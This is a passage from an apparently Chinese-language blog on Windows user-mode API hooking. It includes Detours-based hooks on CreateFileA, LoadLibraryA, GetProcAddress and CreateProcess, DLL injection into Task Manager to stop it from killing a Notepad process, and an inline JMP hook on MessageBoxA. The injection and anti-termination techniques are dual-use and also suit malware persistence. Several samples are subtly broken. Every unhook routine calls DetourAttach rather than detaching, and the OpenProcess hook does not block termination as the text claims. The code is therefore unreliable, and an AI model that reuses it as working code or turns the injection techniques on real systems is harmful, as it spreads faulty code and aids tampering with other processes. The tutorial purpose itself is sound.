class="params">(</span></span><br><span class="line"><span class="params">    _In_ LPCSTR lpFileName,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwShareMode,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwCreationDisposition,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwFlagsAndAttributes,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE hTemplateFile</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* str = <span class="string">&quot;C:\\Users\\test\\Desktop\\testdemo.exe&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!_strcmpi(str, lpFileName)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        sprintf_s(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;拦截到创建文件请求:%s&quot;</span>, lpFileName);</span><br><span class="line">        MessageBoxA(<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        lpFileName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> oldCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,\</span><br><span class="line">            dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oldCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, \</span><br><span class="line">        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldCreateFileA, MyCreateFileA);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//脱钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldCreateFileA, MyCreateFileA);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//拦截创建的文件 CreateFileA</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    hook();</span><br><span class="line">    CreateFileA(<span class="string">&quot;C:\\Users\\test\\Desktop\\testdemo.exe&quot;</span>, GENERIC_ALL, <span class="number">0</span>, <span class="number">0</span>, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="hook防dll注入"><a href="#hook防dll注入" class="headerlink" title="hook防dll注入"></a>hook防dll注入</h4><p>hook LoadLibraryA和GetProcAddress</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE(WINAPI* oldLoadLibraryA)(LPCSTR lpLibFileName) = LoadLibraryA;</span><br><span class="line">FARPROC(WINAPI* oldGetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = GetProcAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE WINAPI <span class="title function_">MyLoadLibraryA</span><span class="params">(LPCSTR lpLibFileName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> oldLoadLibraryA(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC WINAPI <span class="title function_">MyGetProcAddress</span><span class="params">(HMODULE hModule, LPCSTR lpProcName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> oldGetProcAddress(<span class="number">0</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldLoadLibraryA, MyLoadLibraryA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldGetProcAddress, MyGetProcAddress);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//脱钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldLoadLibraryA, MyLoadLibraryA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;oldGetProcAddress, MyGetProcAddress);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(  HMODULE hModule,</span></span><br><span class="line"><span class="params">                        DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                        LPVOID lpReserved</span></span><br><span class="line"><span class="params">                      )</span></span><br><span class="line">&#123;</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;title&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;inject success&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//不要定义成指针</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"></span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen((LPCSTR)title),</span><br><span class="line">            message, lstrlen((LPCSTR)message),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">BOOL (WINAPI* _CreateProcessA)(</span><br><span class="line">     LPCSTR lpApplicationName,</span><br><span class="line">     LPSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOA lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">) = CreateProcessA;</span><br><span class="line"></span><br><span class="line">BOOL(WINAPI* _CreateProcessW)(</span><br><span class="line">     LPCWSTR lpApplicationName,</span><br><span class="line">     LPWSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCWSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOW lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">) = CreateProcessW;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL(WINAPI MyCreateProcessA)(</span><br><span class="line">     LPCSTR lpApplicationName,</span><br><span class="line">     LPSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOA lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="type">int</span> ret = _CreateProcessA( lpApplicationName,</span><br><span class="line">        lpCommandLine,</span><br><span class="line">        lpProcessAttributes,</span><br><span class="line">        lpThreadAttributes,</span><br><span class="line">        bInheritHandles,</span><br><span class="line">        dwCreationFlags,</span><br><span class="line">        lpEnvironment,</span><br><span class="line">        lpCurrentDirectory,</span><br><span class="line">        lpStartupInfo,</span><br><span class="line">        lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;新进程创建提示&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//不要定义成指针</span></span><br><span class="line">    WTSSendMessageW(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        WTSGetActiveConsoleSessionId(),</span><br><span class="line">        title, lstrlen((LPCSTR)title),</span><br><span class="line">        (LPWSTR)lpApplicationName, lstrlen(lpApplicationName),</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">MyCreateProcessW</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpApplicationName,</span></span><br><span class="line"><span class="params">    _Inout_opt_ LPWSTR lpCommandLine,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">    _In_ BOOL bInheritHandles,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwCreationFlags,</span></span><br><span class="line"><span class="params">    _In_opt_ LPVOID lpEnvironment,</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpCurrentDirectory,</span></span><br><span class="line"><span class="params">    _In_ LPSTARTUPINFOW lpStartupInfo,</span></span><br><span class="line"><span class="params">    _Out_ LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = _CreateProcessW(</span><br><span class="line">        lpApplicationName,</span><br><span class="line">        lpCommandLine,</span><br><span class="line">        lpProcessAttributes,</span><br><span class="line">        lpThreadAttributes,</span><br><span class="line">        bInheritHandles,</span><br><span class="line">        dwCreationFlags,</span><br><span class="line">        lpEnvironment,</span><br><span class="line">        lpCurrentDirectory,</span><br><span class="line">        lpStartupInfo,</span><br><span class="line">        lpProcessInformation</span><br><span class="line">    );</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;新进程创建提示&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD resp;<span class="comment">//不要定义成指针</span></span><br><span class="line">    WTSSendMessageW(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        WTSGetActiveConsoleSessionId(),</span><br><span class="line">        title, lstrlen((LPCSTR)title),</span><br><span class="line">        (LPWSTR)lpApplicationName, lstrlen((LPCSTR)lpApplicationName),</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessA, MyCreateProcessA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessW, MyCreateProcessW);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//脱钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessA, MyCreateProcessA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessW, MyCreateProcessW);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;注入成功&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//不要定义成指针</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen(LPCSTR(title)),</span><br><span class="line">            message, lstrlen(LPCSTR(message)),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="防止任务管理器结束某进程"><a href="#防止任务管理器结束某进程" class="headerlink" title="防止任务管理器结束某进程"></a>防止任务管理器结束某进程</h4><p>调用TerminateProcess 结束进程</p>
<p>hook住openprocess 那么任务管理器在调用TerminateProcess时找不到相关句柄就无法结束任务</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE(WINAPI* _OpenProcess)(</span><br><span class="line">    _In_ DWORD dwDesiredAccess,</span><br><span class="line">    _In_ BOOL bInheritHandle,</span><br><span class="line">    _In_ DWORD dwProcessId</span><br><span class="line">) = OpenProcess;</span><br><span class="line"></span><br><span class="line">HANDLE WINAPI <span class="title function_">MyOpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ BOOL bInheritHandle,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwProcessId</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line"></span><br><span class="line">    HWND hwnd = FindWindowW(<span class="string">L&quot;Notepad&quot;</span>, <span class="string">L&quot;无标题 - 记事本&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hwnd != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        _OpenProcess(dwDesiredAccess, bInheritHandle, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE ret = _OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_OpenProcess, MyOpenProcess);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//脱钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_OpenProcess, MyOpenProcess);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">    LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;注入成功&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//不要定义成指针</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen(LPCWSTR(title)),</span><br><span class="line">            message, lstrlen(LPCWSTR(message)),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将dll注入到任务管理器中  然后在任务管理器下强制关闭新建的记事本 会无法关闭</p>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>InlineHook</title>
    <url>/posts/caec0788/</url>
    <content><![CDATA[<p><strong>Ring3层下的Inline Hook是最常用的Hook手段之一，是一种通过修改机器码的方式来实现hook的技术。</strong></p>
<p>JMP的地址 (88881234) – 代码地址 (010073bb) – 5（字节） = 机器码跳转地址 (E9 87879e74)</p>
<h5 id="jmp跳转的地址-自己实现的函数地址-（jmp所在的地址-5"><a href="#jmp跳转的地址-自己实现的函数地址-（jmp所在的地址-5" class="headerlink" title="jmp跳转的地址=自己实现的函数地址-（jmp所在的地址+5)"></a><strong>jmp跳转的地址=自己实现的函数地址-（jmp所在的地址+5)</strong></h5><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="1-需要手动脱钩"><a href="#1-需要手动脱钩" class="headerlink" title="1.   需要手动脱钩"></a>1.   需要手动脱钩</h4><ol>
<li>构造跳转指令。</li>
<li>在内存中找到要Hook函数地址，并保存要Hook位置处的前5字节。</li>
<li>将构造的跳转指令写入需Hook的位置处。</li>
<li>当被Hook位置被执行时会转到自己的流程执行。</li>
<li>如果要执行原来的流程，那么取消Hook，也就是还原被修改的字节。</li>
<li>执行原来的流程。</li>
<li>继续Hook住原来的位置。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* lPMessageBoxA)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span>;</span><br><span class="line"></span><br><span class="line">BYTE olddata32[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	<span class="comment">//调用原来的MessageBoxA API  先脱钩</span></span><br><span class="line">	unhook();</span><br><span class="line">	lPMessageBoxA messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="type">int</span> ret = messagebox(<span class="number">0</span>, <span class="string">&quot;Hook&quot;</span>, <span class="string">&quot;Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	num++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBox被调用%d次\n&quot;</span>,num);</span><br><span class="line">	hook();<span class="comment">//函数中之前再次hok 为了拦截下次调用</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//获取MessageBox的地址</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	BYTE data[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;  <span class="comment">//&#123; 0xe9, &#125;默认初始化为0 0xe9-&gt;jmp</span></span><br><span class="line">	DWORD offset = (DWORD)MyMessageBoxA - messagebox - <span class="number">5</span>; <span class="comment">//计算jmp跳转的偏移量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//保存前五个字节数据</span></span><br><span class="line">	<span class="built_in">memcpy</span>(olddata32, messagebox, <span class="number">5</span>);</span><br><span class="line">	<span class="comment">//把偏移量与 JMP指令拼接</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;data[<span class="number">1</span>], &amp;offset, <span class="number">4</span>); <span class="comment">//4个与jmp指令拼接</span></span><br><span class="line">	<span class="comment">//memcpy(data+1, &amp;offset, 4);  也可以这样写</span></span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//将内存改为可读可写可执行</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	<span class="built_in">memcpy</span>(messagebox, data, <span class="number">5</span>);</span><br><span class="line">	<span class="comment">//还原内存属性</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//脱钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//获取MessageBox的地址</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//将内存改为可读可写可执行</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	<span class="built_in">memcpy</span>(messagebox, olddata32, <span class="keyword">sizeof</span>(olddata32));</span><br><span class="line">	<span class="comment">//还原内存属性</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	hook();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBoxA(<span class="number">0</span>, <span class="string">&quot;正常调用MessageBoxA&quot;</span>, <span class="string">&quot;未Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		Sleep(<span class="number">2000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/caec0788/1.png" alt="img"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>将三条指令保存起来</p>
